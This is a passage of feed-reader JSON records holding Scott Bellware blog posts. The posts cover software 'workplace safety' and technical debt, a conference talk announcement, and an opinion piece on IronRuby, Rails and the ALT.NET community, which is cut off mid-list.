href=\"http://feeds.feedburner.com/~ff/sbellware?a=y8ns4QM5u20:bllo4F3Nvcg:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=TzevzKxY174\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/sbellware/~4/y8ns4QM5u20\" height=\"1\" width=\"1\"/>","author":"Scott Bellware","_id":{"$wrap":"$oid","v":1061}}
{"k":"0000000084","o":"0000019104","v":"001"}
{"_id":1062,"_uid":1062,"_dt":1373742611904,"_s":"f95197c9498fcaef21984647dab73153"}
{"subscription":{"$wrap":"$oid","v":38},"link":"http://feedproxy.google.com/~r/sbellware/~3/oL7ssLp0ICQ/workplace-safety-for-software.html","title":"Workplace Safety for Software Developers","published":{"$wrap":"$date","v":1284390000010,"h":"2010-09-13T15:00:00.010Z"},"starred":false,"read":false,"content":"Software development managers make sure that their workers' physical safety is secured - assuring that office ergonomics are up-to-spec, and in compliance with the prevailing laws and regulations. On the other hand, managers verily require that software development workers undertake some of the riskiest behavior in the contemporary workplace. It's entirely common that software managers require workers to undertake work the crosses the line of being merely questionable, and moves squarely into the territory of negligence. It's not because software development managers are nefarious, but because they are too-often far enough removed from the work of software development to differentiate negligent and hazardous decisions from safe and sound decisions.<br /><br />Without a tangible understanding of the work undertaken by software workers on a day-to-day basis, and an understanding of that work in great detail, software managers are not equipped to know when they are requiring software workers to supplant safety with expediency.<br /><br />Workplace safety is an issue of productivity. Lack of safety breeds low productivity. In the case of software development, \"safety\" is an issue of undertaking work in a fashion that doesn't expose the software worker to unnecessary risk - especially risk that is easily avoided. That is, it's easily avoided for someone who understands the work of software development at a high-enough level of expertise and detail to guide workers away from unsafe practices.<br /><br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"http://3.bp.blogspot.com/_rt8zZqKCZSg/TI2Z2EfT3DI/AAAAAAAAAI0/WqgstL6bWVY/s1600/1210439203-housekeeping.jpg\"><img style=\"margin: 0pt 0pt 0px 10px; float: right; cursor: pointer; width: 227px; height: 320px;\" src=\"http://3.bp.blogspot.com/_rt8zZqKCZSg/TI2Z2EfT3DI/AAAAAAAAAI0/WqgstL6bWVY/s320/1210439203-housekeeping.jpg\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5516234272795778098\" border=\"0\" /></a><br />An unsafe practice in software development is any work done in the present moment that makes work in the next moment take longer to complete. A reasonable analogy for this is the notion in physical materials work of a clean workplace.<br /><br />The purpose of a clean workplace is to remove the clutter that hides unseen, unsafe conditions. It's a lot easier to trip over an errant piece of material in the workplace when its surrounded by a profusion of other errant materials. When hazards are so common that they blend into the background, we simply stop noticing them, and this is how we come to be put at greater risk.<br /><br />The more unsafe clutter we have in our workplace, the more we have to work around. The more we have to work around, the more time it takes us to do work.<br /><br />If a manager can't detect the conditions that makes work take longer to accomplish than expected, he doesn't adjust his expectations for cycle time accordingly. This means that he expects more to get done - the original work, plus the workaround work - in an amount of time that would be reasonable for the completion of the original work alone.<br /><br />This makes workers even more careless, exacerbating the accumulation of obstructions and hazards in the software development workplace as a result. It's a vicious cycle that usually only happens because someone with the authority to avoid problems in the first place doesn't have the experience to recognize the problems and to deal with them.<br /><br />In the words of the ancient Chinese workflow master, Lao Tzu: \"Confront the difficult while it is still easy. Accomplish the great task by a series of small acts.\"<br /><br />Although, you can only do those small tasks if you can detect their presence. The finer your ability to perceive counter-productive deviations, the quicker you can respond to them. The longer you wait, the further off-course you'll be when you finally realize that you need to make a course correction. Someone who doesn't do work can't recognize when that work is off-course. Someone who isn't an expert in the work can recognize when the work is off-course, but his will only recognize it after it has become more expensive to deal with than necessary.<br /><br />And this, as the average software worker would tell you, is the day-to-day conditions in which their work is done. Software work is a constant battle fought against the accumulation of hazardous clutter. Software workers rarely get ahead of the clutter curve, and have to invest significant effort to keep their workplace free of hazards. Paraphrasing<a href=\"http://en.wikipedia.org/wiki/Taiichi_Ohno\" target=\"_blank\">Taiichi Ohno</a>, if you're not moving forward, you're falling behind.<br /><br />Each individual scrap of hazardous material in software development is typically quite small - small enough in fact to be easily deemed negligible - even by people who do the work. The hazard presented by two iota of hazardous waste in software isn't the sum of the hazards - it's the sum of the hazards compounded by some multiplier. Hazards in software don't exist in isolation, they interact with each other creating a higher order of hazards that is greater than the sum of their parts. Two pieces of hazardous software that interact with each other don't create two hazards, they create two hazards compounded by the amount of interactions between these modules. To make matters worse, all modules that interact with hazardous modules in close adjacency also get infected. Lack of day-to-day expertise in software work often leads to negligent underestimation of the risks associated with the \"<a href=\"http://blog.scottbellware.com/2009/02/design-flaws-hernias-and-anemic-quality.html\" target=\"_blank\">design hernias</a>\".<br /><br />Software hazards compound very quickly. It's very easy to arrive at an explosive accumulation of hazardous software materials. It can happen within the first few days of a software project. If subtle hazards in the tools and frameworks that programmers are slated to use are not recognized immediately, the accumulation begins before the first line of code is even written.<br /><br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"http://1.bp.blogspot.com/_rt8zZqKCZSg/TI2batnXGrI/AAAAAAAAAI8/MBgv_KkEcCs/s1600/main.jpg\"><img style=\"margin: 0pt 0pt 0px 10px; float: right; cursor: pointer; width: 226px; height: 320px;\" src=\"http://1.bp.blogspot.com/_rt8zZqKCZSg/TI2batnXGrI/AAAAAAAAAI8/MBgv_KkEcCs/s320/main.jpg\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5516236001822317234\" border=\"0\" /></a><br />When we ask software workers to continue to work in such conditions, we might as well send them into a mine filled with coal dust and require them to hyperventilate for several hours each day. Sooner or later they are going to have to escape the job to escape the hazards, or they are going to acquiesce to the irreconcilable differences between a manager's expectations and the realities of the working conditions that the manager himself feels entitled to not be exposed to for having already \"paid his dues\". This creates dispassionate cynicism in software developers. They come to learn that no matter what they do until they escape the work, they are more than likely going to end up on the losing end of the software work proposition. They learn that they'll get hung with the detritus of negligent software development decisions and direction because decision makers are too far removed from the work to see that it is these critical decisions and directions (or the lack thereof) that are the root cause.<br /><br />In these working conditions, workers constantly face obstructions that are only in-place because they weren't recognized when they were mere seeds of problems rather than towering oaks of looming counter-productivity.<br /><br />The accretions of hazards into founts of the depressed productivity that is status quo for most software teams is fully and completely avoidable - if only the hazards are dealt with when they are small. To see looming hazards when they're small, you have to have detailed knowledge of the work in the here and now. This is simply not possible when managers have removed themselves from the work.<br /><br />It's far too common for software development managers to feel entitled to be removed from the work of software development - as if removal from the work is a reward for having done the work for a number of years. The reward for doing software development work for a number of years is not an escape from the work, but an immersion into a far deeper understanding of it so that its expert insight can guide software work away from hazards. Of all the escapes that can be orchestrated by software workers, an escape into management is indeed and in fact an act of pure negligence.<br /><br />Software work is works in intangibles. Software hazards go unnoticed because they are physically invisible. Taking a bit of liberty with Donald Reinertsen in The Principles of Product Development Flow, we don't see the manifestation of software development safety issues \"when we walk through the engineering department.\" They're \"bits on a hard drive, and we have very big hard drives in product development.\"<br /><br />Managers often try to compensate for their lack of detailed understanding through the use of summary representations like software diagrams. But software diagrams don't show the looming problems while they are still small; still manageable gathering storms that can be dissipated through judicious application of minimally-invasive countermeasures. Only flagrant hazards can be detected in summary representations. Small, detailed course corrections can't be plotted from coarse, summary information. And yet managers who feel entitled to be removed from the work perpetuate the fantasy that summary representations like diagrams are sufficient to bring their purview into action on the software projects they manage. This is pure folly, and software tool vendors are quite happy to continue to exploit it.<br /><br />By the time you've detected a software hazard that can be seen in a summary representation like a software diagram, you're looking at a problem that has festered for far too long. You should be able to detect the chemical markers of the disease long before you notice that lump in a vital organ.<br /><br />Programming work is almost entirely mental. Its effectiveness is influenced by psychology, cognition, awareness, and communication far more than by any material concern like ergonomics, an ultra-fast workstation, or multiple monitors. Software systems are far too large and far too complex to be held in entirety in the conscious focus of any single software worker in any single moment. The devil is always in the details. Summary representations are secondary to the actual raw materials of software: the code. You have to be in the code, and to know enough about code to understand which subtle design differences are looming problems and which aren't.<br /><br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"http://4.bp.blogspot.com/_rt8zZqKCZSg/TI2dCAkwEBI/AAAAAAAAAJM/RiDV-EschVY/s1600/P738_full.jpg\"><img style=\"margin: 0pt 0pt 0px 10px; float: right; cursor: pointer; width: 244px; height: 320px;\" src=\"http://4.bp.blogspot.com/_rt8zZqKCZSg/TI2dCAkwEBI/AAAAAAAAAJM/RiDV-EschVY/s320/P738_full.jpg\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5516237776438169618\" border=\"0\" /></a><br />The average software system is a dark coal mine filled with the poison particulate of tomorrow's case of black lung. We ask developers to work in these conditions every day. We do this because at some point in our careers as managers, we believed that we were entitled to be removed from the details of software work.<br /><br />Sooner or later, enough hazardous software material accretes in a software system that managers step in, and often the first thing they do is look for a root cause in the workmanship of the software workers. The workmanship is rarely the root cause. The absence of informed, skilled, and insightful software management and guidance is always a preeminent cause to unattended workmanship. The workmanship is, of course, a problem, but it's a side-effect.<br /><br />This is like blaming miners for an underground explosion due to the accumulation of day-to-day hazards that result from institutionalized negligence of clear and present dangers that should be managed the moment that they show their first signs. We ask workers to undertake work that they know is not in their best interest. We ask them to do this from our organizational perches far about the hazardous conditions of software projects. And then we hang them with the inevitable costs of this kind of mismanagement.<br /><br />It's the software worker that is required to spend extra time in the mine to balance productivity that is lost to management negligence. It's the software worker who is required to take on the duties on sanitizing data by hand without the safety of the proven automation that should have been built right to begin with. We ask them to validate the decisions that we've made about the tools that they'll use in their work based on little more than a compelling sales pitch from a tool vendor who claims to knows more about the day-to-day work of the software developers in our organizations than we do - vendors who are even further removed from the work than we are.<br /><br />We ask software developers to work against their own interests and the interest of our organizations because we don't understand the hazards that our decisions create.<br /><br />Software workers suffer disruptions to their lives and their livelihoods when this kind of institutionalized negligence drives work policy on software projects. They shoulder the accumulated detritus of uninformed and unskilled management decisions. And they suffer the humiliation of blame when lack of management insight can't see it's own reflection in the root cause mirror. And institutions lose the invaluable institutional knowledge when workers escape the organization altogether. It's always a no-win situation. Everyone loses. And it's completely avoidable.<br /><br />If you're not willing to be in the day-to-day work of software development, you're declaring loud and clear that you're not qualifying yourself for the authority to make decisions that direct software work. Every decision you make risks adding to the accumulation of software hazards. When you do this, you deplete the workplace safety for software workers. You ask them to take risks that the workers themselves know that you can't see, and they know that because you can't see them, that you will likely not understand that the accumulation of avoidable hazards into full-fledged, clear and present dangers is your fault to begin with.<br /><br />Workplace safety is a serious productivity issue. It's a serious issue for the health of workers. It's a basic expression of human respect for the people who work for software development organizations. Understanding workplace safety for software developers requires a high level of expertise in software development, and it requires day-to-day currency in software development. A manager who is not willing to have insight into the details of the work that he is responsible for is patently disrespectful of his workers. He constantly puts them into harm's way by presuming to express authority without knowing whether his expectations are hazardous to the health, well-being, and viability of software work and software workers. Beyond disrespectful, it's dishonorable.<br /><br />The software field isn't at risk of programmers forming a united front and leveraging collective bargaining, and frankly such a thing isn't likely what anyone wants. But dealing with the root cause issues that have driven other industries to such actions is a win for everyone when obstructions to productivity are removed in the process. Addressing software development workplace safety is a good place to start - especially in our current economic conditions, where a massive boost of unimaginable untapped productivity would be a welcome change indeed.<br /><br /><br /><a onblur=\"try {parent.deselectBloggerImageGracefully();} catch(e) {}\" href=\"http://4.bp.blogspot.com/_rt8zZqKCZSg/TI2cXMwotPI/AAAAAAAAAJE/klxfJNBgGIM/s1600/20050905_fg27.jpg\"><img style=\"margin: 0px auto 10px; display: block; text-align: center; cursor: pointer; width: 214px; height: 320px;\" src=\"http://4.bp.blogspot.com/_rt8zZqKCZSg/TI2cXMwotPI/AAAAAAAAAJE/klxfJNBgGIM/s320/20050905_fg27.jpg\" alt=\"\" id=\"BLOGGER_PHOTO_ID_5516237040974869746\" border=\"0\" /></a><br /><br /><hr /><a href=\"http://ampgt.com/\"><img alt=\"Ampersand GT\" src=\"http://ampgt.com/images/ampgt_text_logo.gif\" border=\"0\" /></a><p>Working with software developers and organizations to help realize the potential of software product development through higher productivity, higher quality, and improved customer experience</p><p>Learn more about my work and how I can help you at<a href=\"http://ampgt.com/\" target=\"_blank\">ampgt.com</a></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=oL7ssLp0ICQ:DmLZK_UDVCI:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=oL7ssLp0ICQ:DmLZK_UDVCI:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=oL7ssLp0ICQ:DmLZK_UDVCI:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=oL7ssLp0ICQ:DmLZK_UDVCI:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=7Q72WNTAKBA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=oL7ssLp0ICQ:DmLZK_UDVCI:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=l6gmwiTKsz0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=oL7ssLp0ICQ:DmLZK_UDVCI:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=dnMXMwOfBR0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=oL7ssLp0ICQ:DmLZK_UDVCI:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=oL7ssLp0ICQ:DmLZK_UDVCI:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=oL7ssLp0ICQ:DmLZK_UDVCI:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=TzevzKxY174\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/sbellware/~4/oL7ssLp0ICQ\" height=\"1\" width=\"1\"/>","author":"Scott Bellware","_id":{"$wrap":"$oid","v":1062}}
{"k":"0000000084","o":"0000003642","v":"001"}
{"_id":1063,"_uid":1063,"_dt":1373742611905,"_s":"079838329a7149fffd0ef01d1e80b34e"}
{"subscription":{"$wrap":"$oid","v":38},"link":"http://feedproxy.google.com/~r/sbellware/~3/dDTYWnsli84/speaking-at-lean-software-and-systems.html","title":"Speaking at the Lean Software and Systems Consortium Conference in April","published":{"$wrap":"$date","v":1266452880003,"h":"2010-02-18T00:28:00.003Z"},"starred":false,"read":false,"content":"I'll be speaking at the Lean Software and Systems Consortium Conference, taking place in Atlanta from April 21st to 23rd.<br /><br />My talk addresses the more egregious losses of productivity that come from working with HTML specialists in rapid startups, and how to shape the work, workflow, and team system to leverage the power of specialists without incurring the specialist tax.<br /><br /><span style=\"font-weight: bold;\">Abstract:</span><br />Web designers are highly-specialized professionals. We lose a lot of productivity due to the effects of this specialization, whether through rework, scrap work, relearning, or missed expectations. Rapid startups expect to be up and running within two months, from the start of development work to business launch. Web designers are critical members of web startup teams, and learning to deal with web design specialists is vital to a rapid startup’s ability to sustain its pace. This presentation talks about two web startups that applied lean thinking and pull and flow to this particular challenge, and the techniques and understanding that came from the experience.<br /><br />Check out the full agenda on the LeanSSC conference website:<br /><a href=\"http://atlanta2010.leanssc.org/agenda\">http://atlanta2010.leanssc.org/agenda</a><br /><br /><br /><hr /><a href=\"http://ampgt.com/\"><img alt=\"Ampersand GT\" src=\"http://ampgt.com/images/ampgt_text_logo.gif\" border=\"0\" /></a><br /><p>Working with software developers and organizations to help realize the potential of software product development through higher productivity, higher quality, and improved customer experience<br /></p><p>Learn more about my work and how I can help you at<a href=\"http://ampgt.com/\" target=\"_blank\">ampgt.com</a></p><div class=\"feedflare\"><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=dDTYWnsli84:4RTJWEjNNXI:yIl2AUoC8zA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=yIl2AUoC8zA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=dDTYWnsli84:4RTJWEjNNXI:V_sGLiPBpWU\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=dDTYWnsli84:4RTJWEjNNXI:V_sGLiPBpWU\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=dDTYWnsli84:4RTJWEjNNXI:7Q72WNTAKBA\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=7Q72WNTAKBA\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=dDTYWnsli84:4RTJWEjNNXI:l6gmwiTKsz0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=l6gmwiTKsz0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=dDTYWnsli84:4RTJWEjNNXI:dnMXMwOfBR0\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=dnMXMwOfBR0\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=dDTYWnsli84:4RTJWEjNNXI:gIN9vFwOqvQ\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?i=dDTYWnsli84:4RTJWEjNNXI:gIN9vFwOqvQ\" border=\"0\"></img></a><a href=\"http://feeds.feedburner.com/~ff/sbellware?a=dDTYWnsli84:4RTJWEjNNXI:TzevzKxY174\"><img src=\"http://feeds.feedburner.com/~ff/sbellware?d=TzevzKxY174\" border=\"0\"></img></a></div><img src=\"http://feeds.feedburner.com/~r/sbellware/~4/dDTYWnsli84\" height=\"1\" width=\"1\"/>","author":"Scott Bellware","_id":{"$wrap":"$oid","v":1063}}
{"k":"0000000084","o":"0000028190","v":"001"}
{"_id":1064,"_uid":1064,"_dt":1373742612634,"_s":"646668ea907424fae372ae1c445b9895"}
{"subscription":{"$wrap":"$oid","v":38},"link":"http://feedproxy.google.com/~r/sbellware/~3/Nca5F6G_-XA/ironruby-drops-does-it-make-sound.html","title":"IronRuby Drops - Does it Make a Sound?","published":{"$wrap":"$date","v":1271364120009,"h":"2010-04-15T20:42:00.009Z"},"starred":false,"read":false,"content":"Phil Haack, Program Manager for ASP .NET MVC commented:<br /><blockquote>\"IronRuby RTMs!? Put that in your pipe and smoke it @Bellware. The asymptote has collapsed!\" (<a href=\"http://twitter.com/haacked/statuses/12089448455\">original tweet</a>)</blockquote>I quipped with Phil when he was in Austin a while ago that, \"IronRuby is asymptotic to shipping\", which is the inside joke he's referring to. The point being that IronRuby has taken long enough to ship that it's dangerously close to that point of a multi-year software project where it may not be able to cross the last mile.<br /><br />IronRuby has indeed crossed the last mile, and on April 12th, Jimmy Schementi and team announced the<a href=\"http://ironruby.codeplex.com/releases/view/25901\">availability of IronRuby 1.0</a>.<br /><br />A hearty congratulations to the IronRuby and DLR team for getting IronRuby done, and to<a href=\"http://iunknown.com/\">John Lam</a>for getting the ball rolling with his<a href=\"http://rubyforge.org/projects/rubyclr/\">RubyCLR</a>project in<a href=\"http://rubyforge.org/frs/?group_id=1470\">2006</a>. It's a great accomplishment and another feather in the cap for the ever expanding diaspora of Ruby implementations, and most definitely a giant leap forward for .NET development and programming.<br /><br /><span style=\"font-weight: bold;\">Enter ASP .NET MVC and the Loss of an IronRuby Vanguard</span><br /><br />The furor surrounding Ruby isn't now what it was three years ago when<a href=\"http://iunknown.com/2007/04/introducing-ironruby.html\">IronRuby was announced</a>. In the .NET community, the attention given to Ruby on Rails two and three years ago has largely subsided. The audience has had its attention redirected to ASP .NET MVC. Ultimately, I see this as a loss not only for IronRuby, but arguably also for the community.<br /><br />There are a lot of newly-minted MVC developers in the web development community of .NET developers. I'm skeptical about comparisons made between ASP .NET MVC and Ruby on Rails by folks in the .NET community who haven't shipped a Rails project. These comparisons are often shallow and uninformed by experience. They're also not peer comparisons, and tend to point out things that one framework has that the other doesn't without consideration of whether these features are useful in both paradigms (yes, I sometimes use view models in Rails, I just don't require their signatures to be frozen before runtime so that static analysis tools have an easier job of it).<br /><br />The<a href=\"http://altnetpedia.com/\">ALT.NET</a>community would have been the audience that was best-prepared to perceive and leverage the power of Rails, arguably via IronRuby, but instead it led the vanguard into ASP .NET MVC.<br /><br />There is a tremendous wealth of uses for IronRuby but Rails has been the usual gateway to broader adoption of Ruby. With the<a href=\"http://linuxdevcenter.com/pub/a/mac/2002/05/14/oreilly_wwdc_keynote.html\">Alpha Geek's</a>attention redirected to ASP .NET MVC, the gateway isn't being crossed by the .NET intelligencia the way that it was by the Java community intelligencia that was ALT.NET's most influential inspiration.<br /><br />For folks like myself who've invested enough effort to understand why some of our most respected teachers moved from Java for web application delivery to Ruby and Rails, there's no meaningful comparison of ASP .NET MVC to Rails.<br /><br />While ASP .NET MVC has made significant progress in the past two years, it progresses at a snail's pace. We can contrast ASP .NET MVC's technology to Rails' technology, but this is the typical mistake that .NET developers make when trying to compare ASP .NET MVC to Rails because ASP .NET MVC doesn't have a whole ecosystem on the magnitude of the Rails ecosystem. This ecosystem includes not only the core framework technology itself, but the vast number and quality of plugins and packages for Rails (including those built for general Ruby development), the integrations with value-add services for both web businesses and web infrastructure, the vast array of hosting options and architectures, and the brain trust residing in the Ruby and Rails community.<br /><br />Through a few years of working in Rails, I've come to a deeper understanding of Ruby (but I'm still no expert). And through this experience I've come to look at my own previous feelings about C# and static programming as a little shallow. It doesn't in fact amount to a personal preference, as many monocultural programmers have suggested to me. It's a matter of rational analysis and a willingness to accept the results of that analysis even of it contradicts my strongest feelings, my current preferences, and creature comforts.<br /><br />After working with Ruby for some time, it started to become absurd to me to continue to build dynamic, adaptable systems with languages that aren't a great fit for this kind of work. I began to see that<a href=\"http://www.dofactory.com/Patterns/Patterns.aspx\">static design patterns</a>were inevitably a mostly-wasteful workaround for trying to implement composable designs with languages that are hostile to this goal. I came to see that I was personally stimulated by the efforts to solve these dynamic programming problems with static languages. And I came to see that I wasn't being paid to put myself in the way of interesting but non-essential puzzles just to have a chance to solve them. There are other problems to solve - productivity problems, most notably, and business problems.<br /><br />To me, this meant facing a hard inevitability: the de-emphasizing of a skillset that I had worked years to acquire, and a commitment to re-learning. The payoff, I knew, would be a reward in greater productivity and elevated conscious awareness.<br /><br />I'm still learning, but there are many things that I have already learned in the past three years. One of the most important things that I have learned is that solving dynamic programming problems with static programming languages - while stimulating - is counter-productive except as a performance optimization. And even at that, I might consider alternative solutions, as GitHub, Twitter, and others have done in exploring high-performance, message-based, actor model functional languages like<a href=\"http://www.erlang.org/\">Erlang</a>, a technology underlying new orders of performance technologies like<a href=\"http://couchdb.apache.org/\">CouchDB</a>and<a href=\"http://www.rabbitmq.com/\">RabbitMQ</a>.<br /><br />Most of all, I learned that even some of the most progressive .NET developers - even in today's ALT.NET community - are driven by a trepidation over a programming life without Visual Studio, and by association,<a href=\"http://www.jetbrains.com/resharper/\">ReSharper</a>.<br /><br />I've cautioned for sometime that there's a disturbing tendency toward what I've called \"ReSharper-Driven Development\". Far too many developers don't find anything wrong with saying, \"I won't consider developing without ReSharper\". I'd rather hear developers say, \"I won't consider letting anything get in the way of my discovery of sources and paradigms of productivity and effectiveness that I simply haven't considered or can't conceive of yet\".<br /><br />I've got nothing against ReSharper, Visual Studio, or any other advanced development workbench (like<a href=\"http://www.jetbrains.com/ruby/\">RubyMine</a>, for example). I was in the first wave adopters of ReSharper, and I was the first member of the community to have sponsorship from JetBrains for ReSharper. I was also a user of its predecessor,<a href=\"http://sharptoolbox.com/tools/csharp-refactory\">C# Refactory</a>, going back to Visual Studio 2003. Nonetheless, I'm also willing to use a much more light-weight editor like<a href=\"http://macromates.com/\">TextMate</a>or<a href=\"http://monodevelop.com/\">MonoDevelop</a>. After twenty-some years of playing guitar, I'm also willing to pick up any guitar I can get my hands on just to have an experience of it, knowing that I'll be enriched by the diversity of the experience, and to know that this diversity is the foundation of my ability to continue learning at a pace that matters and to counteract the human tendency toward intellectual contraction and conservatism that is the inevitable side-effect of long-term, focused experience.<br /><br /><span style=\"font-weight: bold;\">ALT.NET without the \"ALT\"</span><br /><br />Some time in late 2007 I proposed \"Integrity, Courage, Diversity\" as ALT.NET's credo and motto. It didn't go too far and I didn't pursue it. It wouldn't be too long afterward that I'd realize that community leaders with great influence would begin to make exceptions for themselves in entitlements to using ALT.NET not for community service, but to justify efforts in celebrity-seeking as conveniently-beneficial to the greater good. ALT.NET became a launching pad for yet-another-BDD-or-MVC-clone-framework in the .NET space, as well as a way to secure increasingly more high-profile public appearances.<br /><br />I didn't agree with<a href=\"http://laribee.com/\">David Laribee</a>when he turned his attentions to means to \"monetize ALT.NET\". ALT.NET had barely established an unshakable foundation in diversity, courage, and integrity and had ultimately begun to come under attack from a myriad parties who wanted it bent to promote this or that bid for materialistic entitlement. It was like watching those parents who are willing to take their toddlers to auditions for movies, commercials, and pageants before the children had become self-actualized in their own sense of integrity. It was too soon. As clear as this was to me then, it's painfully and crystal clear now.<br /><br />I don't agree with<a href=\"http://codebetter.com/blogs/jeremy.miller/\">Jeremy Miller</a>, creator of the .NET MVC framework,<a href=\"http://fubumvc.com/\">FubuMVC</a>, who has suggested that .NET has now matured enough be<a href=\"http://www.altnetpodcast.com/episodes/18-talking-with-jeremy-miller-about-alt-net\">as satisfying as Ruby and Rails</a>. I think that this is only true from a place in life where we're driven unconsciously by the pleasure of solving static programming patterns problems.<br /><br />I don't agree with<a href=\"http://www.lostechies.com/blogs/chad_myers/\">Chad Myers</a>who has implied that FubuMVC has advantages that Rails doesn't, without considering paradigm differences in working with Rails that may negate the value of things that may be advantages to static language pattern development.<br /><br />I took heat from ALT.NET community members when I founded the ALT.NET Summit in 2007, introducing the .NET community to Open Space, and pushing a meme beyond the tipping point that within a couple of months of<a href=\"http://laribee.com/altnet\">Dave's coining of ALT.NET</a>had already started to fade into the typical background noise of fleeting fads. I took heat for building the conference website in Rails, stopping an on-going project to build the site on<a href=\"http://www.castleproject.org/monorail/\">MonoRail</a>after reviewing the site's code written in C# and realizing that the Rails equivalent would be much more<a href=\"http://en.wikipedia.org/wiki/Edsger_W._Dijkstra\">elegant</a>and less frustrating to deal with the torrent of frequent updates that hit a conference website in the weeks leading up to the event.<br /><br />I have a profound respect for Dave having followed suit, building the<a href=\"http://altdotnet.org/\">altdotnet.org</a>website on Rails rather than .NET, learning from experience, and making decisions informed not only by unconscious attachment, but also by experience shipping a project on a technology. I also think it's laudable that<a href=\"http://laribee.com/\">Dave's blog</a>is built on<a href=\"http://wordpress.org/\">WordPress</a>, demonstrating that working with .NET doesn't require you to publish on<a href=\"http://telligent.com/support/communityserver/\">CommunityServer</a>, and that there are best-of-breed solutions outside of .NET monoculture that are preferable - whether they stimulate your current creature comforts or not.<br /><br />ALT.NET was founded as a movement, even though the<span style=\"font-style: italic;\">movement</span>has been all but cleansed from the ALT.NET culture and history. In the redacted quote of Dave's original communication of ALT.NET to the community that holds a prominent position in the<a href=\"http://altnetpedia.com/\">altnetpedia website</a>, the following quote from Emerson is conspicuously absent: \"there are always two parties; the establishment and the movement\". Dave goes on to say, \"If you’re ALT.NET, you’re in the movement. You’re shaking out the innovation. When the movement fails, stalls, or needs improving you’re there starting/finding/supporting that next leap forward.\"<br /><br />Today's representation of ALT.NET stands in stark contrast to what people like myself had invested years of work in studying, practicing, teaching, traveling, meeting across the aisle, negotiating, volunteering, community organization, activism, lobbying, protesting, triumphing, sometimes losing, constantly sustaining and persisting in the face of an entrenched entitled cast of Microsoft community characters, and not just a small amount of personal sacrifice to build.<br /><br />And while Jeremy has gone to great lengths to misrepresent the many years of dedication as a \"holy crusade\" and thus make it unpalatable for members of the ALT.NET community to expect the same commitment of themselves and thus of the community leaders that have not abandoned what ALT.NET had become, ALT.NET's diversity, integrity, and courage continues to become increasingly irrelevant considerations for the community.<br /><br />And as diversity continues to erode, and mediocrity continues to accrete in mainstream .NET, so it does in ALT.NET as ALT.NET becomes the same kind of cultural body as the mainstream that it had intended to provide an alternative for. While ALT.NET adopts the exact same social mechanics as the mainstream entrenchment in serving the celebrity-seeking entitlements, great advances like IronRuby fall by the wayside if they represent inconvenient truths to what is now an ALT.NET establishment.<br /><br /><span style=\"font-weight: bold;\">An Alternative to the Alternative</span><br /><br />If the ALT.NET community continues down the path of fear into the exact same kind of tool-driven development behaviors that it criticizes Workflow Foundation and Entity Framework users for, it will undoubtedly miss the incredible opportunity that IronRuby lays at its feet.<br /><br />ASP .NET MVC is not a peer to Rails. Not by a long shot. C#, even with the<span style=\"font-style: italic;\">dynamic</span>keyword, named parameters, and extension methods, is not a compositional language like Ruby. There is more power in this framework, language, and ecosystem than .NET developers - be they mainstream, ALT.NET, or progressives - may have had the occasion to understand.<br /><br />If you value your experiences with MVC, then you might value the works that ASP .NET MVC has attempted to interpret, largely creating a low-fidelity facsimile that is generations behind the originals. If you're a patterns developer, an agilist, a test-driver, and an amateur of forward-thinking, no-limits technology communities, then the Ruby community - to my eyes - has more to offer you than what has become of ALT.NET in its present incarnation.<br /><br />You don't have to leave .NET and Windows to experience Rails and Ruby as many notable .NET influencers have - although, like them, you might decide that .NET and Windows are unnecessary to building great web products. Nonetheless, now you have a choice.<br /><br />You also have a choice to continue to have your attentions re-directed to lessor solutions. But understand that now that IronRuby has dropped, you're choosing lessor .NET solutions. And while it might be understandable that you aren't comfortable with anything other than Windows, you can experience Rails on IronRuby and use IIS as your application server.<br /><br />And best of all, in the original spirit of ALT.NET, you will have a universe of alternatives available to you if you choose to take advantage of them. Alternatives that include:<br /><ul><li>Immediate support for RESTful design and resource-oriented MVC</li><li>A more mature and fully-featured routing engine including route helpers</li><li>A better plugin model with orders of magnitude more available plugins and service integrations</li><li>A package distribution system right now with Ruby Gems</li><li>Hosting in the cloud without constraints using platforms like Amazon EC2, 